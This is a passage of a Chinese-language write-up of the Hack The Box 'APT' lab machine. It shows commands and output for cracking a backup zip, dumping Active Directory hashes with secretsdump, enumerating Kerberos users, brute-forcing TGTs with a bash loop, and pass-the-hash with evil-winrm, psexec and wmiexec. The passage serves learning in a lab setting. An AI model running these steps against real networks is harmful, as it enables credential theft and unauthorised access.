class="hljs-variable">registry</span><span class="hljs-operator">/</span><span class="hljs-variable">SECURITY</span>       <span class="hljs-variable">incorrect</span> <span class="hljs-variable">password</span><br>   <span class="hljs-variable">skipping</span><span class="hljs-operator">:</span> <span class="hljs-variable">registry</span><span class="hljs-operator">/</span><span class="hljs-variable">SYSTEM</span>         <span class="hljs-variable">incorrect</span> <span class="hljs-variable">password</span><br></code></pre></td></tr></table></figure>
+
+<p>查看压缩文件中的列表，可以发现其中有 AD 目录和注册表目录</p>
+<ul>
+<li>ntds.dit 是域控制器中的 SAM</li>
+<li>ntds.jfm 是 ntds.dit 写入丢失的文件</li>
+</ul>
+<h2 id="zip-爆破"><a href="#zip-爆破" class="headerlink" title="zip 爆破"></a>zip 爆破</h2><p>备份的文件时效性可能没那么强。解压需要密码，那我们就是用 john 爆破一下。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿racknerd-4565a8)-[~/htb/apt]<br>└─$ zip2john backup.zip<br>ver 2.0 backup.zip/Active Directory/ is not encrypted, or stored with non-handled compression <span class="hljs-built_in">type</span><br>ver 2.0 backup.zip/Active Directory/ntds.dit PKZIP Encr: cmplen=8483543, decmplen=50331648, crc=ACD0B2FB ts=9CCA cs=acd0 <span class="hljs-built_in">type</span>=8<br>ver 2.0 backup.zip/Active Directory/ntds.jfm PKZIP Encr: cmplen=342, decmplen=16384, crc=2A393785 ts=9CCA cs=2a39 <span class="hljs-built_in">type</span>=8<br>ver 2.0 backup.zip/registry/ is not encrypted, or stored with non-handled compression <span class="hljs-built_in">type</span><br>ver 2.0 backup.zip/registry/SECURITY PKZIP Encr: cmplen=8522, decmplen=262144, crc=9BEBC2C3 ts=9AC6 cs=9beb <span class="hljs-built_in">type</span>=8<br>ver 2.0 backup.zip/registry/SYSTEM PKZIP Encr: cmplen=2157644, decmplen=12582912, crc=65D9BFCD ts=9AC6 cs=65d9 <span class="hljs-built_in">type</span>=8<br>backup.zip:$pkzip<span class="hljs-variable">$4</span>*1*1*0*8*24*9beb*0f135e8d5f02f852643d295a889cbbda196562ad42425146224a8804421ca88f999017ed*1*0*8*24*65d9*2a1c4c81fb6009425c2d904699497b75d843f69f8e623e3edb81596de9e732057d17fae8*1*0*8*24*acd0*0949e46299de5eb626c75d63d010773c62b27497d104ef3e2719e225fbde9d53791e11a5*2*0*156*4000*2a393785*81733d*37*8*156*2a39*0325586c0d2792d98131a49d1607f8a2215e39d59be74062d0151084083c542ee61c530e78fa74906f6287a612b18c788879a5513f1542e49e2ac5cf2314bcad6eff77290b36e47a6e93bf08027f4c9dac4249e208a84b1618d33f6a54bb8b3f5108b9e74bc538be0f9950f7ab397554c87557124edc8ef825c34e1a4c1d138fe362348d3244d05a45ee60eb7bba717877e1e1184a728ed076150f754437d666a2cd058852f60b13be4c55473cfbe434df6dad9aef0bf3d8058de7cc1511d94b99bd1d9733b0617de64cc54fc7b525558bc0777d0b52b4ba0a08ccbb378a220aaa04df8a930005e1ff856125067443a98883eadf8225526f33d0edd551610612eae0558a87de2491008ecf6acf036e322d4793a2fda95d356e6d7197dcd4f5f0d21db1972f57e4f1543c44c0b9b0abe1192e8395cd3c2ed4abec690fdbdff04d5bb6ad12e158b6a61d184382fbf3052e7fcb6235a996*$/pkzip$::backup.zip:Active Directory/ntds.jfm, registry/SECURITY, registry/SYSTEM, Active Directory/ntds.dit:backup.zip<br>NOTE: It is assumed that all files <span class="hljs-keyword">in</span> each archive have the same password.<br>If that is not the <span class="hljs-keyword">case</span>, the <span class="hljs-built_in">hash</span> may be uncrackable. To avoid this, use<br>option -o to pick a file at a time.<br></code></pre></td></tr></table></figure>
+
+<p>先使用 zip2john 来获得哈希，接下来使用 john 爆破</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gradle">┌──(i3eg1nner㉿racknerd-<span class="hljs-number">4565</span>a8)-[~<span class="hljs-regexp">/htb/</span>apt]<br>└─$ vim ziphash<br><br>┌──(i3eg1nner㉿racknerd-<span class="hljs-number">4565</span>a8)-[~<span class="hljs-regexp">/htb/</span>apt]<br>└─$ sudo john ziphash --wordlist=<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt<br>Using <span class="hljs-keyword">default</span> input encoding: UTF-<span class="hljs-number">8</span><br>Loaded <span class="hljs-number">1</span> password hash (PKZIP [<span class="hljs-number">32</span>/<span class="hljs-number">64</span>])<br>Will run <span class="hljs-number">2</span> OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost <span class="hljs-keyword">any</span> other key <span class="hljs-keyword">for</span> status<br>iloveyousomuch   (backup.zip)<br><span class="hljs-number">1</span>g <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> DONE (<span class="hljs-number">2023</span>-<span class="hljs-number">10</span>-<span class="hljs-number">31</span> <span class="hljs-number">07</span>:<span class="hljs-number">09</span>) <span class="hljs-number">100.0</span>g<span class="hljs-regexp">/s 819200p/</span>s <span class="hljs-number">819200</span>c<span class="hljs-regexp">/s 819200C/</span>s newzealand..whitetiger<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed.<br></code></pre></td></tr></table></figure>
+
+<h2 id="secretsdump"><a href="#secretsdump" class="headerlink" title="secretsdump"></a>secretsdump</h2><p>接下来我们要使用 <code>secretsdump</code> 工具来提取其中的信息，在这个场景中，想到使用这个工具，是一种经验。</p>
+<p>这里推荐一个网站 <a target="_blank" rel="noopener" href="https://wadcoms.github.io/">WADComs</a> 其中收集了很多域环境中的常用工具及其命令。还有一篇文章 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11877#toc-22">Impacket脚本利用指南（上） - 先知社区 (aliyun.com)</a></p>
+<blockquote>
+<p>secretsdump.py	提供各种技术以不运行任何程序远程 dump 密码。对 SAM 和 LSA 以及缓存的凭据，会尝试从目标注册表中读取并将 hives 保存在%SYSTEMROOT%\Temp 目录，再将 hives 读取回来。<strong>对于 DIT 文件</strong>，会使用 DL_DRSGetNCChanges 函数来 dump 目标的 NTLM hash、明文密码和 Kerberos keys。也可以通过 smbexec 或 wmiexec 执行 vssadmin 得到 NTDS.dit，并对其进行解密。这个脚本在服务不可用的情况下会打开对应的服务，例如远程注册表。在执行结束后，会将激活的服务还原。</p>
+</blockquote>
+<p>当然 HackTricks 永远滴神 <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/stealing-credentials#extracting-hashes-from-ntds.dit">Stealing Windows Credentials - HackTricks</a></p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs elixir">┌──(i3eg1nner㉿racknerd<span class="hljs-number">-4565</span>a8)-[~/htb/apt]<br>└─<span class="hljs-variable">$ </span>impacket-secretsdump -ntds <span class="hljs-title class_">Active</span>\ <span class="hljs-title class_">Directory</span>/ntds.dit -system registry/<span class="hljs-title class_">SYSTEM</span> <span class="hljs-title class_">LOCAL</span> &gt; user_hash_raw<br><br>┌──(i3eg1nner㉿racknerd<span class="hljs-number">-4565</span>a8)-[~/htb/apt]<br>└─<span class="hljs-variable">$ </span>cat user_hash_raw | wc -l<br><span class="hljs-number">8005</span><br><br>┌──(i3eg1nner㉿racknerd<span class="hljs-number">-4565</span>a8)-[~/htb/apt]<br>└─<span class="hljs-variable">$ </span>head -n <span class="hljs-number">20</span> user_hash_raw<br><span class="hljs-title class_">Impacket</span> v0.<span class="hljs-number">10.0</span> - <span class="hljs-title class_">Copyright</span> <span class="hljs-number">2022</span> <span class="hljs-title class_">SecureAuth</span> <span class="hljs-title class_">Corporation</span><br><br>[*] <span class="hljs-title class_">Target</span> system <span class="hljs-symbol">bootKey:</span> <span class="hljs-number">0x936ce5da88593206567f650411e1d16b</span><br>[*] <span class="hljs-title class_">Dumping</span> <span class="hljs-title class_">Domain</span> <span class="hljs-title class_">Credentials</span> (domain\<span class="hljs-symbol">uid:</span><span class="hljs-symbol">rid:</span><span class="hljs-symbol">lmhash:</span>nthash)<br>[*] <span class="hljs-title class_">Searching</span> <span class="hljs-keyword">for</span> pekList, be patient<br>[*] <span class="hljs-title class_">PEK</span> <span class="hljs-comment"># 0 found and decrypted: 1733ad403c773dde94dddffa2292ffe9</span><br>[*] <span class="hljs-title class_">Reading</span> <span class="hljs-keyword">and</span> decrypting hashes from <span class="hljs-title class_">Active</span> <span class="hljs-title class_">Directory</span>/ntds.dit<br><span class="hljs-symbol">Administrator:</span><span class="hljs-number">500</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span>b576acbe6bcfda7294d6bd18041b8fe:::<br><span class="hljs-symbol">Guest:</span><span class="hljs-number">501</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br><span class="hljs-symbol">DefaultAccount:</span><span class="hljs-number">503</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br><span class="hljs-title class_">APT</span><span class="hljs-variable">$:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:b300272f1cdab4469660d55fe59415cb</span>:::<br><span class="hljs-symbol">krbtgt:</span><span class="hljs-number">502</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">72791983</span>d95870c0d6dd999e4389b211:::<br><span class="hljs-symbol">jeb.sloan:</span><span class="hljs-number">3200</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span>ea25adafeec63e38cef4259d3b15c30:::<br><span class="hljs-symbol">ranson.mejia:</span><span class="hljs-number">3201</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span>ae49ec5e6fed82ceea0dc2be77750ab:::<br><span class="hljs-symbol">unice.daugherty:</span><span class="hljs-number">3202</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">531</span>c98e26cfa3caee2174af495031187:::<br><span class="hljs-symbol">kazuo.deleon:</span><span class="hljs-number">3203</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:fde29e6cb61b4f7fda1ad5cd2759329d</span>:::<br><span class="hljs-symbol">dacy.frederick:</span><span class="hljs-number">3204</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">51</span>d368765462e9c5aebc456946d8dc86:::<br><span class="hljs-symbol">emeline.boone:</span><span class="hljs-number">3205</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">273</span>c48fb014f8e5bf9e2918e3bf7bfbd:::<br><span class="hljs-symbol">baris.martin:</span><span class="hljs-number">3206</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">98590500</span>f99a1bee7559e97ad342d995:::<br><span class="hljs-symbol">mea.cash:</span><span class="hljs-number">3207</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span>cf01167854082e180cf549f63c0285::<span class="hljs-symbol">:</span><br></code></pre></td></tr></table></figure>
+
+<p>这里的格式是：<code>用户名:用户SID值:LM Hash:NTLM Hash:::</code> 但是包含的数据不仅仅有这种格式。发现一篇博客介绍 NTLM 很不错：<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D">Windows下的密码hash——NTLM hash和Net-NTLM hash介绍 (3gstudent.github.io)</a> </p>
+<p>内容比较多，一共包含了八千多条信息。我们先看前二十个，虽然里面第一个就是 Administrator 的哈希，但是考虑到靶机的难度，这里直接使用哈希传递攻击获得管理员权限的概率很低，依然可以尝试。这里用到的 <code>evil-winrm</code> 工具的详细介绍可以看看这篇博客 <a target="_blank" rel="noopener" href="https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/">A Detailed Guide on Evil-Winrm - Hacking Articles</a>。需要补充的是，<code>evil-winrm</code> 默认端口是 5985，再就是 evil-winrm 是可以加载本地 powershell 脚本和 exe 允许文件的，详细过程可在上面的博客中找到。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿racknerd-4565a8)-[~/htb/apt]<br>└─$ evil-winrm -i htb.local -u administrator -H <span class="hljs-string">&#x27;2b576acbe6bcfda7294d6bd18041b8fe&#x27;</span><br><br>Evil-WinRM shell v3.5<br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> is unimplemented on this machine<br><br>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br>Error: An error of <span class="hljs-built_in">type</span> WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError<br><br>Error: Exiting with code 1<br></code></pre></td></tr></table></figure>
+
+<p>另外，secretdump 导出的信息中包含不同类型的数据</p>
+<p><img src="/pic/2470964adde62b7e6efc05bab3d6ff66_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里我们最应该关注的是 Windows NTLM 哈希，值得注意的是 <code>用户名:用户SID值:LM Hash:NTLM Hash:::</code> 格式中一般 LM Hash 一般为 <code>d167c3238864b12f5f82feae86a7f798</code> 意为无密码的 LM 哈希</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿racknerd-4565a8)-[~/htb/apt]<br>└─$ grep <span class="hljs-string">&quot;:::&quot;</span> user_hash_raw | <span class="hljs-built_in">wc</span> -l<br>2000<br>┌──(i3eg1nner㉿racknerd-4565a8)-[~/htb/apt]<br>└─$ grep <span class="hljs-string">&quot;:::&quot;</span> user_hash_raw | awk -F <span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;&#123;printf &quot;%s:%s\n&quot;,$3,$4&#125;&#x27;</span> &gt; hash_list<br>┌──(i3eg1nner㉿racknerd-4565a8)-[~/htb/apt]<br>└─$ grep <span class="hljs-string">&quot;:::&quot;</span> user_hash_raw | awk -F <span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> &gt; user_list<br></code></pre></td></tr></table></figure>
+
+<p>接下来要进行碰撞，由于数据量比较大，我们优先筛选一下有效的用户名。</p>
+<h2 id="Kerbrute-用户枚举"><a href="#Kerbrute-用户枚举" class="headerlink" title="Kerbrute 用户枚举"></a>Kerbrute 用户枚举</h2><p>这里涉及到预认证机制，建议再看看 Kerberos 协议 AS_REQ 阶段的过程。这里我们要用的是 Kerbrute 工具。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿racknerd-4565a8)-[~/htb/apt]<br>└─$ ./kerbrute_linux_amd64 userenum -d htb.local --dc htb.local user_list<br><br>    __             __               __<br>   / /_____  _____/ /_  _______  __/ /____<br>  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \<br> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/<br>/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/<br><br>Version: v1.0.3 (9dad6e1) - 10/31/23 - Ronnie Flathers @ropnop<br><br>2023/10/31 09:42:46 &gt;  Using KDC(s):<br>2023/10/31 09:42:46 &gt;   htb.local:88<br><br>2023/10/31 09:42:51 &gt;  [+] VALID USERNAME:       Administrator@htb.local<br>2023/10/31 09:42:51 &gt;  [+] VALID USERNAME:       APT<span class="hljs-variable">$@htb</span>.<span class="hljs-built_in">local</span><br>2023/10/31 09:46:43 &gt;  [+] VALID USERNAME:       henry.vinson@htb.local<br>2023/10/31 10:00:03 &gt;  Done! Tested 2000 usernames (3 valid) <span class="hljs-keyword">in</span> 1037.577 seconds<br></code></pre></td></tr></table></figure>
+
+<p>需要等待的时间较长，我们也可以使用 nmap 脚本来交叉验证</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿racknerd-4565a8)-[~/htb/apt]<br>└─$ sudo nmap -6 -p88 --script=krb5-enum-users --script-args krb5-enum-users.realm=<span class="hljs-string">&#x27;htb.local&#x27;</span>,userdb=user_list htb.local<br>[sudo] password <span class="hljs-keyword">for</span> i3eg1nner:<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-31 10:07 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> htb.local (dead:beef::b885:d62a:d679:573f)<br>Host is up (0.079s latency).<br><br>PORT   STATE SERVICE<br>88/tcp open  kerberos-sec<br>| krb5-enum-users:<br>| Discovered Kerberos principals<br>|     Administrator@htb.local<br>|     APT<span class="hljs-variable">$@htb</span>.<span class="hljs-built_in">local</span><br>|_    henry.vinson@htb.local<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 17.14 seconds<br></code></pre></td></tr></table></figure>
+
+<p>扫描结果一致，且 nmap 扫描速度快得多。</p>
+<p>接下来尝试使用 crackmapexec 工具来对 smb, ladp, winrm 进行哈希传递攻击，这里红队笔记 UP 触发了防护机制，导致 IP 被禁，这里只放一张截图，留作备注</p>
+<p><img src="/pic/af6b750cefaf042229d58a597e0b7bce_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>那么就不能直接使用此工具来爆破了，HTB 官方 WP 中提到 <code>Kerbrute doesn&#39;t support bruteforcing hashes</code> 因此换了工具：有中文的解释，建议读一读<a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87Kerberos-pre-auth%E8%BF%9B%E8%A1%8C%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E5%92%8C%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4">渗透技巧——通过Kerberos pre-auth进行用户枚举和口令爆破 (3gstudent.github.io)</a> 不过还是需要自己修改脚本的，那不如按找红队笔记 UP 的思路接着走</p>
+<h2 id="GetTGT-爆破"><a href="#GetTGT-爆破" class="headerlink" title="GetTGT 爆破"></a>GetTGT 爆破</h2><p>这里我们要进行碰撞，需要用到 impacket-getTGT 工具，这里要写个调用的脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash </span><br><br><span class="hljs-keyword">while</span> IFS=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-built_in">read</span> -r LINE || [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;LINE&#125;</span>&quot;</span> ]<br><span class="hljs-keyword">do</span><br>	<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;------&quot;</span><br>	<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Feed the Hash:<span class="hljs-variable">$&#123;LINE&#125;</span>&quot;</span><br>	impacket-getTGT htb.local/henry.vinson@htb.local -hashes <span class="hljs-variable">$&#123;LINE&#125;</span> <br><span class="hljs-keyword">done</span> &lt; hash_list<br></code></pre></td></tr></table></figure>
+
+<p>impacket-getTGT 如果成功，则会在当前目录生成票据文件，因此可以监控目录中的文件数量，当数量变化时，关闭脚本，从而不至于淹没在脚本的大量输出中。</p>
+<p>复现的时候遇到了一个问题，并没有如预期中那样，生成 <code>henry.vinson@apt.htb.ccache</code> 文件，我还是淹没在了输出中。接下来属于排查的过程，假设通过耐心翻找发现了目标哈希，此时的输出是这样的</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">------</span><br><span class="hljs-code">Feed the Hash:aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb</span><br><span class="hljs-code">Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation</span><br><span class="hljs-code"></span><br><span class="hljs-code">Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</span><br><span class="hljs-code">------</span><br></code></pre></td></tr></table></figure>
+
+<p>关键词 <code>Clock skew too great</code> 我们继续搜索 <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast">Kerberoast - HackTricks</a></p>
+<p><img src="/pic/e5e6041b2153951d9d2cbceb1820b8f7_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>还有一篇 APT 靶机的 WP，也提到了这个问题 <a target="_blank" rel="noopener" href="https://zweilosec.github.io/posts/apt/#gettgtpy-cont">Hack the Box - APT Writeup | Hacker’s Rest (zweilosec.github.io)</a></p>
+<p>作者经过排查发现，是自己之前曾经在打靶机的时候，与另一台靶机进行了时钟同步导致的……我也突然意识到，我和作者是同样的错误，难绷。同时 APT 靶机并没有时钟同步服务，幸好翻到了这篇博客，不然自己排查不知道要花多少时间。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿racknerd-4565a8)-[~/htb/apt]<br>└─$ sudo ntpdate pool.ntp.org<br>[sudo] password <span class="hljs-keyword">for</span> i3eg1nner:<br>2023-10-31 05:18:23.410441 (-0400) -28790.653051 +/- 1.006571 pool.ntp.org 204.2.134.162 s3 no-leap<br>CLOCK: time stepped by -28790.653051<br>┌──(i3eg1nner㉿racknerd-4565a8)-[~/htb/apt]<br>└─$ impacket-getTGT -hashes <span class="hljs-string">&#x27;aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb&#x27;</span> htb.local/henry.vinson@htb.local<br>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation<br><br>[*] Saving ticket <span class="hljs-keyword">in</span> henry.vinson@htb.local.ccache<br></code></pre></td></tr></table></figure>
+
+<p>找到了这个意外的原因。事后诸葛亮一下，其实我们可以通过 <code>Saving ticket</code> 作为关键词搜索结果，如果和我刚才一样遇到了时钟同步的问题，那么可以使用 <code>Clock skew</code> 作为关键词。但是如果我并不知道这两个关键词呢？尝试自己改了一下脚本的逻辑：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash </span><br><br><span class="hljs-keyword">while</span> IFS=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-built_in">read</span> -r LINE || [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;LINE&#125;</span>&quot;</span> ]<br><span class="hljs-keyword">do</span><br>	<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;------&quot;</span><br>	<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Feed the Hash:<span class="hljs-variable">$&#123;LINE&#125;</span>&quot;</span><br>	impacket-getTGT htb.local/henry.vinson@htb.local -hashes <span class="hljs-variable">$&#123;LINE&#125;</span> | grep -q <span class="hljs-string">&quot;invalid&quot;</span><br>	<span class="hljs-keyword">if</span> [ $? -eq 0 ]; <span class="hljs-keyword">then</span>  <br>    	<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span>  <br>	<span class="hljs-keyword">else</span>  <br>    	<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;success!!!!&quot;</span><br>    	<span class="hljs-built_in">break</span><br>	<span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span> &lt; hash_list<br></code></pre></td></tr></table></figure>
+
+<p>基于错误结果的观察，增加了关于是否有 invalid 关键词的判断，若不存在此关键词，则认为成功，终止程序。</p>
+<p><img src="/pic/7cad8e63ac47007e8462329a64810eb1_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><h3 id="哈希传递攻击尝试"><a href="#哈希传递攻击尝试" class="headerlink" title="哈希传递攻击尝试"></a>哈希传递攻击尝试</h3><p>接下来要开始尝试哈希传递攻击</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">//evil-winrm 进行哈希传递攻击只需要NTLM Hash即可<br>evil-winrm -i htb.local -u henry.vinson -H <span class="hljs-string">&#x27;e53d87d42adaa3ca32bdb34a876cbffb&#x27;</span> <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">psexec.py -hashes <span class="hljs-string">&#x27;aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb&#x27;</span> htb.<span class="hljs-keyword">local</span>/henry.vinson<span class="hljs-symbol">@htb</span>.<span class="hljs-keyword">local</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p> Impacket’s Implementation creates a remote service by uploading a randomly-named executable to the hidden Windows <code>ADMIN$</code> share, registering a service via RPC and the Windows Service Control Manager, and then communicating over named a named pipe.And it will often get caught by antivirus. Psexec requires credentials for a user with <strong>local administrator privileges or higher</strong> since reading&#x2F;writing to the <code>ADMIN$</code> share is required.<br> use <code>exit</code> command instand of <code>ctrl + C</code></p>
+</blockquote>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">wmiexec.py -hashes <span class="hljs-string">&#x27;aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb&#x27;</span> htb.<span class="hljs-keyword">local</span>/henry.vinson<span class="hljs-symbol">@htb</span>.<span class="hljs-keyword">local</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
